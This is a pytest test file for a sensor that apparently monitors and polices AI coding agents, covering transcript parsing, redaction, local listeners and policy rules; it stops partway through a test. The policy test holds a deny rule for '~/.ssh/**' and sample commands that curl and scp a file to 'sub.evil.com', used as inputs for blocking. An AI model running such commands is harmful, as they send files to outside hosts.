import builtins
import copy
import json
from pathlib import Path
import os
import re
import subprocess
import sys
import threading
import time

import pytest

from openaidr.core.protocol import default_sensor_config
from openaidr.sensor.config import Config, capture_overrides
from openaidr.sensor.collectors import Collector, Offsets, Parser
from openaidr.core.policy import Policy, compile_glob
from openaidr.core.redact import SecretRedactor, redact_event, redact_string
from openaidr.sensor.spool import Spool
from openaidr.sensor import hooks, hostinfo
from openaidr.sensor.runtime import Sensor
from openaidr.core.toolmap import map_tool
from openaidr.sensor.local_http import BoundedThreadingMixIn, LoopbackHTTPServer


@pytest.mark.parametrize("layout", ["local_session", "agent/local_session"])
@pytest.mark.parametrize("platform, data_root", [
    ("darwin", "Library/Application Support/Claude"),
    ("win32", "AppData/Roaming/Claude"),
    ("win32", "AppData/Local/Claude"),
])
def test_cowork_audit_discovery_checkpoints_and_capture_gates(tmp_path, monkeypatch, layout, platform, data_root):
    from types import SimpleNamespace

    monkeypatch.setattr("openaidr.sensor.collectors.sys", SimpleNamespace(platform=platform))
    path = tmp_path / data_root / "local-agent-mode-sessions/org/account" / layout / "audit.jsonl"
    path.parent.mkdir(parents=True)
    old = {"type": "user", "session_id": "session", "uuid": "old", "message": {"content": "old private prompt"}}
    path.write_text(json.dumps(old) + "\n")
    events = []
    checkpoints = tmp_path / "offsets"
    collector = Collector("cowork", [tmp_path], [], Offsets(checkpoints), False, events.append)
    collector.poll(True)
    assert not any(event["kind"] == "prompt" for event in events)
    events.clear()
    record = {"type": "assistant", "session_id": "session", "uuid": "call", "_audit_timestamp": "2026-10-23T12:00:00Z",
              "_audit_hmac": "opaque", "message": {"content": [
                  {"type": "tool_use", "name": "Bash", "id": "tool-1", "input": {"command": "ls /tmp"}}]}}
    with path.open("a") as stream:
        stream.write(json.dumps(record) + "\n")
    collector.poll()
    command = next(event for event in events if event["kind"] == "command")
    assert command["agent"]["product"] == "cowork"
    assert command["session"]["id"] == "session"
    assert command["time"] == record["_audit_timestamp"]
    assert command["source"]["collector"] == "cowork-audit"
    assert command["source"]["audit_integrity"] == "unverified"
    assert command["command"]["text"] == "ls /tmp"
    assert "_audit_hmac" not in json.dumps(command)
    events.clear()
    collector = Collector("cowork", [tmp_path], [], Offsets(checkpoints), False, events.append)
    collector.poll(True)
    assert not any(event["kind"] == "command" for event in events)
    with path.open("a") as stream:
        stream.write(json.dumps({**old, "uuid": "new", "message": {"content": "new private prompt"}}) + "\n")
    collector.poll()
    prompt = next(event for event in events if event["kind"] == "prompt")
    capture = default_sensor_config()["capture"]
    capture["prompt_text"] = False
    assert "new private prompt" not in json.dumps(redact_event(prompt, capture))


@pytest.mark.parametrize("host", ["0.0.0.0", "::", "192.168.1.1", "device.local"])
def test_local_listener_rejects_non_loopback_addresses(host):
    with pytest.raises(ValueError):
        LoopbackHTTPServer((host, 0), None)


@pytest.mark.parametrize("transport", ["ipv4", "ipv6", "unix"])
def test_local_listener_bounds_unread_requests_and_recovers_slots(tmp_path, monkeypatch, transport):
    import http.client
    from http.server import BaseHTTPRequestHandler
    import socket
    import socketserver

    entered = threading.Condition()
    calls, errors = [], []

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *_):
            pass

        def do_POST(self):
            with entered:
                calls.append(self.path)
                entered.notify_all()
            body = self.rfile.read(1)
            if body == b"!":
                raise ValueError("test handler failure")
            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.end_headers()

    if transport == "unix":
        if not hasattr(socketserver, "UnixStreamServer"):
            pytest.skip("Unix sockets are unavailable")

        class Server(BoundedThreadingMixIn, socketserver.UnixStreamServer):
            max_requests = 2

        monkeypatch.chdir(tmp_path)
        server = Server("listener.sock", Handler)
        family = socket.AF_UNIX
    else:
        class Server(LoopbackHTTPServer):
            max_requests = 2
            daemon_threads = False

        server = Server(("::1" if transport == "ipv6" else "127.0.0.1", 0), Handler)
        family = server.address_family
    server.handle_error = lambda *_: errors.append("failed")
    worker = threading.Thread(target=server.serve_forever)
    worker.start()
    clients = []

    def connect():
        peer = socket.socket(family, socket.SOCK_STREAM)
        peer.settimeout(3)
        peer.connect(server.server_address)
        clients.append(peer)
        return peer

    def response(peer):
        reply = http.client.HTTPResponse(peer)
        reply.begin()
        reply.read()
        return reply

    try:
        for index in range(2):
            peer = connect()
            peer.sendall(b"POST /hold HTTP/1.0\r\nContent-Length: 1\r\n\r\n")
            with entered:
                assert entered.wait_for(lambda: len(calls) == index + 1, timeout=3)
        for _ in range(20):
            # A third worker must not even read the request headers.
            reply = response(connect())
            assert reply.status == 503
            assert reply.getheader("Retry-After") == "5"
            assert reply.getheader("Connection") == "close"
        assert calls == ["/hold", "/hold"]
        clients[0].sendall(b"!")
        assert clients[0].recv(1) == b""
        clients[1].sendall(b"x")
        assert response(clients[1]).status == 200
        deadline = time.monotonic() + 3
        while True:
            peer = connect()
            peer.sendall(b"POST /recovered HTTP/1.0\r\nContent-Length: 1\r\n\r\nx")
            reply = response(peer)
            if reply.status == 200:
                break
            assert reply.status == 503 and time.monotonic() < deadline
            time.sleep(0.01)
        assert calls == ["/hold", "/hold", "/recovered"]
        assert errors == ["failed"]
    finally:
        for peer in clients:
            peer.close()
        server.shutdown()
        worker.join(3)
        server.server_close()


def test_config_private_roundtrip_and_capture(tmp_path):
    config = Config(
        tmp_path / "sensor.yaml", sensor_token="secret", server_url="http://localhost/"
    )
    config.save()
    assert Config.load(config.path)["server_url"] == "http://localhost"
    if os.name != "nt":
        assert config.path.stat().st_mode & 0o777 == 0o600
    capture = capture_overrides(
        default_sensor_config()["capture"],
        {"prompt_text": False, "raw": True, "redact": False},
    )
    assert not capture["prompt_text"] and not capture["raw"] and capture["redact"]


@pytest.mark.parametrize("transport", ["tcp", "unix"])
@pytest.mark.parametrize("idle_count", [0, 8, 64])
def test_idle_and_unauthenticated_peers_cannot_take_hook_workers(tmp_path, monkeypatch, backend_hook, transport, idle_count):
    import http.client
    import httpx
    import socket
    import tempfile
    import selectors
    from openaidr.sensor.local_http import HookAdmissionMixIn

    class WindowsCompatibleSelector(selectors.SelectSelector):
        def select(self, timeout=None):
            assert self.get_map(), "Winsock rejects an empty select"
            return super().select(timeout)

    monkeypatch.setattr(selectors, "DefaultSelector", WindowsCompatibleSelector)
    idle = threading.Event()
    service_actions = HookAdmissionMixIn.service_actions

    def observe_idle(self):
        service_actions(self)
        if not self.waiting:
            idle.set()

    monkeypatch.setattr(HookAdmissionMixIn, "service_actions", observe_idle)

    if transport == "unix" and os.name == "nt":
        pytest.skip("Unix sockets are unavailable")
    with tempfile.TemporaryDirectory() as directory, socket.socket() as reservation:
        reservation.bind(("127.0.0.1", 0))
        address = reservation.getsockname()
        reservation.close()
        sock = str(Path(directory) / "sensor.sock")
        server = hooks.HookServer(f"127.0.0.1:{address[1]}", sock, lambda _: None,
                                  lambda: {}, {}, token="account-token")
        stop = threading.Event()
        worker = threading.Thread(target=server.run, args=(stop,))
        worker.start()
        peers = []
        client = httpx.Client(trust_env=False, timeout=3,
                             transport=httpx.HTTPTransport(uds=sock) if transport == "unix" else None)
        endpoint = "http://" + server.listen
        headers = {"Authorization": "Bearer account-token"}
        try:
            assert idle.wait(5)
            deadline = time.monotonic() + 5
            while True:
                try:
                    assert client.get(endpoint + "/healthz", headers=headers).status_code == 200
                    break
                except httpx.TransportError:
                    assert time.monotonic() < deadline
                    time.sleep(0.01)
            for _ in range(idle_count):
                peer = socket.socket(socket.AF_UNIX if transport == "unix" else socket.AF_INET)
                peer.settimeout(3)
                peer.connect(sock if transport == "unix" else address)
                peers.append(peer)
            if transport == "tcp":
                for _ in range(8):
                    peer = socket.create_connection(address, timeout=3)
                    peers.append(peer)
                    peer.sendall((f"POST /v1/hooks/claude-code HTTP/1.0\r\nHost: {server.listen}\r\n"
                                  "Content-Type: application/json\r\nContent-Length: 4194304\r\n\r\n").encode())
                    reply = http.client.HTTPResponse(peer)
                    reply.begin()
                    assert reply.status == 401
                    reply.read()
            for action in ("deny", "allow"):
                if idle_count == 0:
                    idle.clear()
                    assert idle.wait(5)
                check = server.check = backend_hook(action=action)
                reply = client.post(endpoint + "/v1/hooks/claude-code", headers=headers, json={
                    "hook_event_name": "PreToolUse", "session_id": "test", "tool_name": "Bash",
                    "tool_input": {"command": "rm /tmp/example"},
                })
                assert reply.status_code == 200
                assert reply.json()["decision"] == action
                assert len(check.requests) == 1
        finally:
            client.close()
            for peer in peers:
                peer.close()
            stop.set()
            worker.join(5)
        assert not worker.is_alive()


def test_policy_order_globs_command_hosts():
    rule = {
        "id": "deny",
        "name": "protect secrets",
        "enabled": True,
        "action": "deny",
        "match": {"path_glob": "~/.ssh/**"},
    }
    document = {"version": 3, "rules": [rule]}
    policy = Policy(document)
    assert (
        policy.evaluate({"file": {"path": "/home/another/.ssh/id_rsa"}})["action"]
        == "deny"
    )
    policy.set(
        {
            "rules": [
                dict(rule, match={"host_glob": "*.evil.com"}),
                dict(rule, id="bad", match={"command_regex": "["}),
            ]
        }
    )
    assert policy.errors
    for text in ("curl https://sub.evil.com/path", "scp file user@sub.evil.com:/tmp"):
        assert policy.evaluate({"command": {"text": text}})["action"] == "deny"
    assert (
        policy.evaluate({"command": {"text": "curl https://example.com"}})["action"]
        == "deny"
    )
    assert "invalid matcher" in policy.evaluate({"command": {"text": "curl https://example.com"}})["reason"]
    assert compile_glob("/tmp/**/x").match("/tmp/x")
    reason = "Block requests to jev.example"
    policy.set({"rules": [dict(rule, reason=reason, match={"host_glob": "jev.example"})]})
    for host, action in (("jev.example", "deny"), ("Guardrail.example", "allow")):
        decision = policy.evaluate({"command": {"text": f"curl https://{host}"}})
        assert decision["action"] == action
        if action == "deny":
            assert decision["reason"] == reason


def test_redaction_and_utf8_limits():
    text, names = redact_string("password=hunter22 ghp_" + "a" * 36)
    assert "hunter22" not in text and "github-token" in names
    event = {
        "kind": "prompt",
        "text": "é" * 20,
        "tool": {"input": {"password": "hunter22"}, "output": "secret=abcdefg"},
    }
    capture = default_sensor_config()["capture"]
    capture["max_text_bytes"] = 9
    redact_event(event, capture)
    assert len(event["text"].encode()) <= 9 and event["truncated"]
    assert event["tool"]["input"]["_truncated"]


def test_secret_redaction_rules_can_be_extended_in_yaml(tmp_path):
    rules = tmp_path / "secret-redaction.yaml"
    rules.write_text(
        "secret_key_pattern: '(^|_)vault_key($|_)'\n"
        "patterns:\n"
        "  - name: custom-token\n"
        "    pattern: 'custom_[A-Za-z0-9]{8}'\n"
    )
    redactor = SecretRedactor(rules)
    assert redactor.is_secret_key("my_vault_key")
    assert redactor.redact("2026-09-30 custom_12345678") == (
        "2026-09-30 [REDACTED:custom-token]",
        ["custom-token"],
    )


@pytest.mark.parametrize(
    "rules",
    [
        "patterns: []\n",
        "secret_key_pattern: token\npatterns:\n  - name: broken\n    pattern: '['\n",
        "secret_key_pattern: token\npatterns:\n  - name: broken\n    pattern: '(abc)'\n    group: 2\n",
    ],
)
def test_invalid_secret_redaction_rules_fail_to_load(tmp_path, rules):
    path = tmp_path / "secret-redaction.yaml"
    path.write_text(rules)
    with pytest.raises((ValueError, re.error)):
        SecretRedactor(path)


def test_tool_mappings():
    assert map_tool("claude-code", "Bash", {"command": "ls"})[0]["kind"] == "command"
    assert (
        map_tool("gemini-cli", "web_fetch", {"prompt": "fetch https://example.com."})[
            0
        ]["network"]["host"]
        == "example.com"
    )
    assert (
        len(
            map_tool(
                "codex-cli", "apply_patch", raw="*** Add File: a\n*** Update File: b"
            )
        )
        == 2
    )
    assert (
        map_tool(
            "codex-cli", "exec", raw='await tools.exec_command({"cmd":"echo hi"})'
        )[0]["command"]["text"]
        == "echo hi"
    )


def test_claude_parser_pairs_results_and_filters_injected():
    parser = Parser("claude-code", "/home/alice/log.jsonl")
    base = {
        "sessionId": "s",
        "cwd": "/tmp",
        "type": "assistant",
        "message": {
            "model": "claude",
            "content": [
                {
                    "type": "tool_use",
                    "name": "Bash",
                    "id": "c",
                    "input": {"command": "ls"},
                }
            ],
        },
    }
    events = parser.parse(base, 1)
    assert [e["kind"] for e in events] == ["session.start", "command"]
    assert events[1]["host"]["user"] == "alice"
    result = parser.parse(
        dict(
            base,
            type="user",
            toolUseResult={"exitCode": 2},
            message={
                "content": [
                    {"type": "tool_result", "tool_use_id": "c", "content": "failed"}
                ]
            },
        ),
        2,
    )[0]
    assert result["command"]["exit_code"] == 2 and result["tool"]["name"] == "Bash"
    skipped = parser.parse(
        dict(base, type="user", message={"content": "<system-reminder>ignore"})
    )
    assert skipped[0]["kind"] == "sensor" and "text" not in skipped[0]
    assert skipped[0]["evidence"]["gaps"] == ["skipped_content"]


def test_codex_effort_follows_turn_context_without_stale_defaults():
    parser = Parser("codex-cli", "/tmp/rollout.jsonl")
    parser.parse({"type": "session_meta", "payload": {"id": "s"}})
    observed = []
    for index, effort in enumerate(("high", "medium", None, "invalid", "none", "xhigh")):
        context = {"model": "gpt-6-astra", "turn_id": str(index)}
        if effort is not None:
            context["effort"] = effort
        assert parser.parse({"type": "turn_context", "payload": context}) == []
        event = parser.parse({"type": "response_item", "payload": {
            "type": "message", "role": "assistant", "content": [{"text": "Done"}],
        }})[-1]
        assert event["session"]["turn_id"] == str(index)
        observed.append(event["agent"].get("reasoning_effort"))
    assert observed == ["high", "medium", None, None, "none", "xhigh"]


def test_codex_parser_metadata_reopen_and_injected_parts():
    parser = Parser("codex-cli", "/tmp/rollout.jsonl")
    events = parser.parse(
        {
            "type": "session_meta",
            "payload": {"id": "s", "cwd": "/tmp", "cli_version": "1"},
        }
    )
    assert events[0]["kind"] == "session.start"
    events = parser.parse(
        {
            "type": "response_item",
            "payload": {
                "type": "message",
                "role": "user",
                "content": [{"text": "<environment_context>x"}, {"text": "hello"}],
            },
        }
    )
    assert events[0]["text"] == "hello"
    assert events[0]["evidence"]["gaps"] == ["skipped_content"]
    assert (
        parser.parse({"type": "event_msg", "payload": {"type": "task_complete"}})[0][
            "kind"
        ]
        == "session.end"
    )
    events = parser.parse(
        {
            "type": "response_item",
            "payload": {
                "type": "function_call",
                "name": "exec_command",
                "call_id": "c",
                "arguments": '{"cmd":"ls"}',
            },
        }
    )
    assert [e["kind"] for e in events] == ["session.start", "command"]
    event = parser.parse(
        {
            "type": "response_item",
            "payload": {
                "type": "function_call_output",
                "call_id": "c",
                "output": "Exit code: 7",
            },
        }
    )[0]
    assert event["command"]["exit_code"] == 7


def test_tailer_partial_append_restart_and_rotation(tmp_path):
    path = tmp_path / "session.jsonl"
    record = {"sessionId": "s", "type": "user", "message": {"content": "hello"}}
    path.write_text(json.dumps(record))
    offsets = Offsets(tmp_path / "offsets.json")
    events = []
    collector = Collector("claude-code", [], [str(path)], offsets, True, events.append)
    collector.poll(True)
    assert not events
    with path.open("a") as f:
        f.write("\n")
    collector.poll()
    assert [e["kind"] for e in events] == ["session.start", "prompt"]
    events.clear()
    collector = Collector(
        "claude-code", [], [str(path)], Offsets(offsets.path), True, events.append
    )
    collector.poll(True)
    assert events[0]["evidence"]["gaps"] == ["parser_restart"]
    assert events[0]["session"]["id"] == "s"
    events.clear()
    replacement = tmp_path / "replacement"
    replacement.write_text(json.dumps(record) + "\n")
    replacement.replace(path)
    collector.poll()
    assert [e["kind"] for e in events] == ["sensor", "session.start", "prompt"]
    assert all(e["evidence"]["gaps"] == ["source_reset"] for e in events)


def test_transcript_caches_evict_without_replaying_or_losing_appends(tmp_path, monkeypatch):
    from openaidr.sensor import collectors

    monkeypatch.setattr(collectors, "MAX_PARSERS", 3)
    paths = [tmp_path / f"session-{index}.jsonl" for index in range(8)]
    record = {"sessionId": "s", "type": "user", "message": {"content": "first"}}
    for path in paths:
        path.write_text(json.dumps(record) + "\n")
    events = []
    offsets = Offsets(tmp_path / "offsets.json")
    collector = Collector("claude-code", [], [str(tmp_path / "*.jsonl")], offsets, True, events.append)
    collector.poll(True)
    assert len(collector.files) == 3
    assert len([event for event in events if event["kind"] == "prompt"]) == 8
    evicted = next(path for path in paths if str(path) not in collector.files)
    events.clear()
    collector.poll()
    assert events == []
    with evicted.open("a") as stream:
        stream.write(json.dumps({**record, "message": {"content": "appended"}}) + "\n")
    collector.poll()
    assert [event["text"] for event in events if event["kind"] == "prompt"] == ["appended"]
    assert len(collector.files) <= 3
    for path in paths:
        path.unlink()
    collector.poll()
    assert collector.files == {}
    # A file temporarily moved out of the scan still has a durable checkpoint.
    assert Offsets(offsets.path).get("claude-code", str(evicted))["offset"] > 0
    assert len(json.loads(offsets.path.read_text())) == 8


def test_tool_matching_retains_only_bounded_context():
    import gc
    import tracemalloc
    from openaidr.sensor.collectors import MAX_PENDING_BYTES

    parser = Parser("claude-code", "/synthetic/session.jsonl")
    tracemalloc.start()
    try:
        before = tracemalloc.get_traced_memory()[0]
        for index in range(500):
            parser.remember(str(index), {"tool": {"name": "Read", "input": "x" * (64 << 10)}})
        gc.collect()
        assert tracemalloc.get_traced_memory()[0] - before < 1 << 20
    finally:
        tracemalloc.stop()
    for index in range(10):
        parser.remember("command-" + str(index), {"tool": {"name": "Bash"},
                        "command": {"text": "x" * (64 << 10), "cwd": "/repo"}})
    assert parser.pending_bytes <= MAX_PENDING_BYTES
    result = lambda call: parser.parse({"sessionId": "s", "type": "user", "message": {"content": [
        {"type": "tool_result", "tool_use_id": call, "content": "done"}
    ]}})[-1]
    assert "missing_tool_call" in result("command-0")["evidence"]["gaps"]
    paired = result("command-9")
    assert paired["tool"]["name"] == "Bash" and paired["command"]["cwd"] == "/repo"
    assert paired["command"]["text"] == "x" * (64 << 10)
    assert "missing_tool_call" not in paired["evidence"]["gaps"]


def test_collector_backpressure_retains_one_record_and_resumes_removed_source(tmp_path, monkeypatch):
    from openaidr.sensor import collectors

    monkeypatch.setattr(collectors, "MAX_PARSERS", 2)
    for index in range(12):
        (tmp_path / f"{index}.jsonl").write_text(json.dumps({
            "sessionId": f"s-{index}", "type": "user", "message": {"content": str(index)},
        }) + "\n")
    failing, events = True, []

    def emit(event):
        if failing and event["kind"] == "prompt":
            raise OSError("storage unavailable")
        events.append(event)

    offsets = Offsets(tmp_path / "offsets.json")
    collector = Collector("claude-code", [], [str(tmp_path / "*.jsonl")], offsets, True, emit)
    collector.poll(True)
    assert len(collector.files) == 1
    original = Path(next(iter(collector.files)))
    retained = original.with_suffix(".saved")
    original.rename(retained)
    failing = False
    collector.poll()
    prompts = [event for event in events if event["kind"] == "prompt"]
    assert len(prompts) == 12 and len({event["text"] for event in prompts}) == 12
    assert str(original) not in collector.files
    assert len(collector.files) <= 2
    events.clear()
    retained.rename(original)
    collector.poll()
    assert events == []


@pytest.mark.parametrize("failure", ["corrupt", "directory"])
def test_optional_checkpoint_failure_preserves_sensor_and_skipped_history(tmp_path, monkeypatch, failure):
    database = tmp_path / "offsets.json.sqlite3"
    if failure == "corrupt":
        database.write_bytes(b"not a sqlite database")
    else:
        database.mkdir()
    config = Config(tmp_path / "config", server_url="http://localhost", sensor_id="s",
                    sensor_token="t", data_dir=str(tmp_path), telemetry={"enabled": False},
                    inventory={"enabled": False}, component_inventory={"enabled": False},
                    collectors={"cowork": {"enabled": False}})
    sensor = Sensor(config)
    assert sensor.collectors == [] and not sensor.offsets.initialized
    source = tmp_path / "session.jsonl"

    def record(text):
        return json.dumps({"type": "user", "sessionId": "s", "message": {"content": text}}) + "\n"

    source.write_text(record("private old history"))
    events = []
    collector = Collector("claude-code", [], [str(source)], sensor.offsets, False, events.append)
    collector.poll(True)
    assert collector.error and not events and not collector.files
    collector.poll()
    assert collector.error and not events
    if database.is_dir():
        database.rmdir()
    else:
        database.unlink()
    collector.poll()
    assert not collector.error and not [e for e in events if e["kind"] != "sensor"]
    with source.open("a") as stream:
        stream.write(record("new after repair"))
    collector.poll()
    assert [e["text"] for e in events if e["kind"] == "prompt"] == ["new after repair"]
    assert "private old history" not in json.dumps(events)

    def unavailable():
        raise OSError("checkpoint storage unavailable")

    monkeypatch.setattr(sensor.offsets, "flush", unavailable)
    collector.poll()
    assert collector.error == "checkpoint storage unavailable"
    # Shut down real core resources even when optional checkpoint flushing fails.
    closed = []
    for name in ("spool", "hook_clients", "client"):
        resource = getattr(sensor, name)
        close = resource.close
        def tracked_close(name=name, close=close):
            close()
            closed.append(name)
        monkeypatch.setattr(resource, "close", tracked_close)
    for owner, name in ((sensor.hooks, "run"), (sensor, "ship_loop"), (sensor, "heartbeat_loop"),
                        (sensor, "hook_receipts_loop"), (sensor.project_metadata, "run")):
        monkeypatch.setattr(owner, name, lambda stop: None)
    stop = threading.Event()
    stop.set()
    sensor.run(stop)
    assert closed == ["spool", "hook_clients", "client"]


def test_checkpoint_migration_and_rollback_preserve_progress(tmp_path):
    path = tmp_path / "offsets.json"
    key = "claude-code|/session.jsonl"
    path.write_text(json.dumps({key: {"offset": 42}}))
    current = Offsets(path)
    assert current.get("claude-code", "/session.jsonl") == {"offset": 42}
    current.set("claude-code", "/session.jsonl", {"offset": 84})
    current.flush()
    assert json.loads(path.read_text())[key] == {"offset": 84}
    # A previous sensor version still writes JSON after a rollback.
    path.write_text(json.dumps({key: {"offset": 126}}))
    restored = Offsets(path)
    assert restored.get("claude-code", "/session.jsonl") == {"offset": 126}
    restored.set("claude-code", "/second.jsonl", {"offset": 7})
    restored.flush()
    assert json.loads(path.read_text()) == {key: {"offset": 126}, "claude-code|/second.jsonl": {"offset": 7}}


def test_checkpoint_history_import_and_flush_have_bounded_memory(tmp_path):
    import tracemalloc

    path = tmp_path / "offsets.json"
    with path.open("w") as stream:
        stream.write("{")
        for index in range(5000):
            if index:
                stream.write(",")
            stream.write(json.dumps(f"claude-code|/session-{index}.jsonl") + ":" +
                         json.dumps({"offset": index, "session_id": "s" * 256, "gaps": []}))
        stream.write("}")
    tracemalloc.start()
    try:
        offsets = Offsets(path)
        offsets.flush()
        assert offsets.get("claude-code", "/session-4999.jsonl")["offset"] == 4999
        assert tracemalloc.get_traced_memory()[1] < 2 << 20
    finally:
        tracemalloc.stop()
    # A malformed legacy file must not import only its valid prefix.
    path.write_text('{"claude-code|/session-0.jsonl":{"offset":5},"broken":')
    assert Offsets(path).get("claude-code", "/session-0.jsonl") is None


def test_gemini_document_incremental(tmp_path):
    path = tmp_path / "session-g.json"
    doc = {
        "sessionId": "g",
        "messages": [{"id": "1", "type": "user", "content": "old"}],
    }
    path.write_text(json.dumps(doc))
    events = []
    collector = Collector(
        "gemini-cli",
        [],
        [str(path)],
        Offsets(tmp_path / "offsets"),
        False,
        events.append,
    )
    collector.poll(True)
    assert events[0]["evidence"]["gaps"] == ["skipped_history"]
    assert events[0]["session"]["id"] == "g"
    events.clear()
    doc["messages"].append(
        {
            "id": "2",
            "type": "gemini",
            "toolCalls": [
                {
                    "name": "run_shell_command",
                    "args": {"command": "ls"},
                    "result": "ok",
                    "status": "success",
                }
            ],
        }
    )
    path.write_text(json.dumps(doc))
    collector.poll()
    assert [e["kind"] for e in events] == ["command", "tool.result"]
    assert all(e["evidence"]["sequence"] == 2 for e in events)
    assert all(e["evidence"]["gaps"] == ["skipped_history"] for e in events)
    events.clear()
    collector.poll()
    assert not events


@pytest.mark.parametrize(
    "initial_document",
    [
        "malformed", "oversized", "invalid_identity", "invalid_messages",
        "missing_messages", "unreadable",
    ],
)
def test_gemini_no_backfill_waits_for_valid_baseline_across_restart(
    tmp_path, monkeypatch, initial_document
):
    path = tmp_path / "session-g.json"
    doc = {
        "sessionId": "native-a",
        "messages": [{"type": "user", "content": "private historical prompt"}],
    }
    if initial_document == "malformed":
        path.write_text('{"messages":')
    elif initial_document == "oversized":
        with path.open("wb") as stream:
            stream.truncate((64 << 20) + 1)
    else:
        invalid = dict(doc)
        if initial_document == "invalid_identity":
            invalid["sessionId"] = "x" * 257
        elif initial_document == "invalid_messages":
            invalid["messages"] = {"content": "private historical prompt"}
        elif initial_document == "missing_messages":
            invalid.pop("messages")
        path.write_text(json.dumps(invalid))
    open_document = Path.open
    unreadable = initial_document == "unreadable"

    def read_document(source, *args, **kwargs):
        if source == path and unreadable:
            raise PermissionError("temporarily unreadable")
        return open_document(source, *args, **kwargs)

    monkeypatch.setattr(Path, "open", read_document)
    offset_path = tmp_path / "offsets"
    events = []
    for _ in range(2):
        collector = Collector(
            "gemini-cli", [], [str(path)], Offsets(offset_path), False, events.append
        )
        collector.poll(True)
    assert not [e for e in events if e["kind"] != "sensor"]
    unreadable = False
    doc["messages"].append({"type": "user", "content": "arrived during recovery"})
    path.write_text(json.dumps(doc))
    events.clear()
    collector.poll()
    assert not [e for e in events if e["kind"] != "sensor"]
    assert any("skipped_history" in e["evidence"]["gaps"] for e in events)
    assert "private historical prompt" not in offset_path.read_text()
    assert "arrived during recovery" not in offset_path.read_text()
    doc["messages"].append({"type": "user", "content": "newly appended prompt"})
    path.write_text(json.dumps(doc))
    events.clear()
    Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), False, events.append
    ).poll(True)
    assert [e["text"] for e in events if e["kind"] == "prompt"] == [
        "newly appended prompt"
    ]
    replayed = []
    Collector(
        "gemini-cli", [], [str(path)], Offsets(tmp_path / "backfill"), True,
        replayed.append,
    ).poll(True)
    assert [e["text"] for e in replayed if e["kind"] == "prompt"] == [
        message["content"] for message in doc["messages"]
    ]


@pytest.mark.parametrize("initial_native_id", [None, "native-a"])
def test_gemini_skipped_prefix_survives_identity_changes_and_same_session_resets(
    tmp_path, initial_native_id
):
    path = tmp_path / "session-g.json"
    history = [{"type": "user", "content": f"private history {i}"} for i in range(2)]
    doc = {"messages": history.copy()}
    if initial_native_id:
        doc["sessionId"] = initial_native_id
    path.write_text(json.dumps(doc))
    offset_path = tmp_path / "offsets"
    events = []
    Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), False, events.append
    ).poll(True)
    assert not [e for e in events if e["kind"] != "sensor"]
    doc["sessionId"] = "native-a"
    doc["messages"].append({"type": "user", "content": "new tail"})
    path.write_text(json.dumps(doc))
    events.clear()
    collector = Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), False, events.append
    )
    collector.poll(True)
    assert [e["text"] for e in events if e["kind"] == "prompt"] == ["new tail"]
    for native_id, messages, expected in (
        (None, doc["messages"], ["new tail"]),
        ("native-a", history[:1], []),
        ("native-a", [*history, {"type": "user", "content": "reset tail"}], ["reset tail"]),
        ("native-b", [{"type": "user", "content": "new session"}], ["new session"]),
        ("native-a", [*history, {"type": "user", "content": "return tail"}], ["return tail"]),
    ):
        changed = {"messages": messages}
        if native_id:
            changed["sessionId"] = native_id
        path.write_text(json.dumps(changed))
        events.clear()
        collector.poll()
        prompts = [e for e in events if e["kind"] == "prompt"]
        assert [e["text"] for e in prompts] == expected
        assert "private history" not in json.dumps(events)
        if native_id == "native-b":
            assert "skipped_history" not in prompts[0]["evidence"]["gaps"]
        elif prompts:
            assert all("skipped_history" in e["evidence"]["gaps"] for e in prompts)


def test_gemini_file_discovered_after_startup_keeps_capture_intent_on_restart(tmp_path):
    path = tmp_path / "session-new.json"
    offset_path = tmp_path / "offsets"
    events = []
    collector = Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), False, events.append
    )
    collector.poll(True)
    path.write_text('{"messages":')
    collector.poll()
    path.write_text(json.dumps({
        "sessionId": "new-session",
        "messages": [{"type": "user", "content": "created after startup"}],
    }))
    events.clear()
    Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), False, events.append
    ).poll(True)
    prompts = [e for e in events if e["kind"] == "prompt"]
    assert [e["text"] for e in prompts] == ["created after startup"]
    assert "skipped_history" not in prompts[0]["evidence"]["gaps"]


@pytest.mark.parametrize("saved_count", [0, 1])
@pytest.mark.parametrize("native_id", [None, "native-a"])
def test_gemini_old_checkpoint_preserves_no_backfill_on_upgrade(
    tmp_path, saved_count, native_id
):
    path = tmp_path / "session-g.json"
    doc = {"messages": [{"type": "user", "content": "excluded startup history"}]}
    if native_id:
        doc["sessionId"] = native_id
    path.write_text(json.dumps(doc))
    stat = path.stat()
    offset_path = tmp_path / "offsets"
    offsets = Offsets(offset_path)
    # Actual pre-evidence checkpoint shape: zero also represented an unreadable file.
    offsets.set("gemini-cli", str(path), {
        "offset": saved_count, "line": 0, "id": f"{stat.st_dev}:{stat.st_ino}",
        "size": stat.st_size, "started": False,
    })
    offsets.flush()
    events = []
    Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), False, events.append
    ).poll(True)
    assert not [event for event in events if event["kind"] != "sensor"]
    assert "excluded startup history" not in offset_path.read_text()
    doc["sessionId"] = "native-a"
    doc["messages"].append({"type": "user", "content": "new after upgrade"})
    path.write_text(json.dumps(doc))
    events.clear()
    Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), False, events.append
    ).poll(True)
    assert [event["text"] for event in events if event["kind"] == "prompt"] == [
        "new after upgrade"
    ]
    assert "excluded startup history" not in json.dumps(events)


def test_transcript_evidence_replay_logical_calls_and_record_order():
    metadata = {"type": "session_meta", "payload": {"id": "native-session"}}
    patch = {
        "type": "response_item",
        "payload": {
            "type": "custom_tool_call",
            "name": "apply_patch",
            "call_id": "patch-1",
            "input": "*** Add File: a\n*** Update File: b",
        },
    }
    parser = Parser("codex-cli", "/tmp/rollout.jsonl")
    parser.parse(metadata, 1)
    events = parser.parse(patch, 2)
    assert [e["kind"] for e in events] == ["file.write", "file.write"]
    assert len({e["evidence"]["logical_id"] for e in events}) == 1
    assert len({e["evidence"]["observation_id"] for e in events}) == 2
    assert [e["evidence"]["part"] for e in events] == [1, 2]
    for fresh, started in ((True, False), (False, True)):
        replay = Parser("codex-cli", "/tmp/rollout.jsonl", fresh=fresh, started=started)
        replay.session["id"] = "native-session"
        replayed = replay.parse(patch, 2)
        assert [e["evidence"] for e in replayed if e["kind"] == "file.write"] == [
            e["evidence"] for e in events
        ]
    prompt = {
        "type": "response_item",
